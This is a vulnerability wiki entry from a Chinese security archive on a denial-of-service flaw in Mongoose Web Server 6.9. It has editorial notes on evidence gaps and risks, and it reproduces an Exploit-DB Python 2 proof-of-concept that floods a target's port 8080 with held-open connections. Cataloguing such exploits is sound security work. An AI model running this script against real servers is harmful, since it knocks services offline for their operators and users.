---
source: "白阁文库 BaizeSec/bylibrary"
title: "Mongoose Web Server 6.9 - Denial of Service"
product: "Cesanta Mongoose Web Server6.9（非Node.js ODM）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "目标8080服务可达、资源限制/超时允许大量保持连接；平台实验Win7x64"
runtime: "历史示例含 Python 2 专用依赖；未进行运行验证"
source_status: "unknown"
side_effects: "含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
id: "vw-3e0f240ae18af17c19bdc996"
entity_id: "ve-3e0f240ae18af17c19bdc996"
schema_version: "1"
---

# Mongoose Web Server 6.9 - Denial of Service

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：目标8080服务可达、资源限制/超时允许大量保持连接；平台实验Win7x64
- 证据范围：脚本无限保留socket并发送BOOM，只凭连接错误打印Done不能区分服务崩溃、服务端限流或本机fd耗尽；没有漏洞根因和恢复观测。

### 本次正文校订

- 运行时标注：原示例含 Python 2 专用语法或模块，不能直接按 Python 3 运行；不在本次校订中迁移或执行。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 须与420同名Node.js Mongoose区分产品身份
- Python2依赖，固定8080、无限循环无速率/次数/关闭连接
- CVE明确N/A不应硬配编号；没有响应/崩溃堆栈或补丁
- 工具下载来源和2018日期已给，应保留历史版本不当当前指南

### 操作风险与资料使用

- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

**|**漏洞来源 

 https://www.exploit-db.com/exploits/45819
                                                            

                                                 

#####  **|**漏洞EXP                            

```
# Exploit Title: Mongoose Web Server 6.9 - Denial of Service (PoC)
# Dork: N/A
# Date: 2018-11-11
# Exploit Author: Ihsan Sencan
# Vendor Homepage: https://cesanta.com/binary.html
# Software Link: https://backend.cesanta.com/cgi-bin/api.cgi?act=dl&os=win
# Version: 6.9
# Category: Dos
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A

# POC: 
# 1)

#!/usr/bin/python
import socket

print """
         \\\|///
       \\  - -  //
        (  @ @ )
 ----oOOo--(_)-oOOo----
Mongoose Web Server 6.9
    Ihsan Sencan
 ---------------Ooooo----
                (   )
       ooooO     ) /
       (   )    (_/
        \ (
         \_)
"""
Ip = raw_input("[Ip]: ")
Port = 8080 # Default port
 
d=[]
c=0
while 1:
    try:
        d.append(socket.create_connection((Ip,Port)))
        d[c].send("BOOM")
        print "Sie!"
        c+=1
    except socket.error: 
        print "Done!"
        raw_input()
        break
```


---

> 来源：白阁文库 BaizeSec/bylibrary
